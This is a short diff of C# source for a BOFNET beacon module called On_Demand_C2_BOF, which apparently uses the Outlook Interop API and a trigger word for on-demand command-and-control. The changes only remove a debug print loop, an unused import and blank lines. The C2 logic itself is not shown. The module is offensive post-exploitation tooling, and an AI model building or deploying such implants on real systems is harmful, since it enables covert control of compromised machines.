@@ -1,7 +1,6 @@
 ﻿using BOFNET;
 using Microsoft.Office.Interop.Outlook;
 using System;
-using System.Diagnostics;
 using System.Threading;
 
 
@@ -35,13 +34,6 @@ namespace On_Demand_C2_BOF
 
         public override void Go(string[] args)
         {
-            int count = 0;
-            foreach (var item in args)
-            {
-                BeaconConsole.WriteLine($"{count}: {item}");
-                count++;
-            }
-
             if (args.Length != 2)
             {
                 BeaconConsole.WriteLine("wrong args.\r\n" +
@@ -60,7 +52,6 @@ namespace On_Demand_C2_BOF
 
             OnDemandC2(args[0], args[1]);
         }
-
 
          void OnDemandC2(string type, string triggerWord)
         {
@@ -107,8 +98,6 @@ namespace On_Demand_C2_BOF
                 WaitForReply.Set();
             }
         }
-
-
     }
 
 }
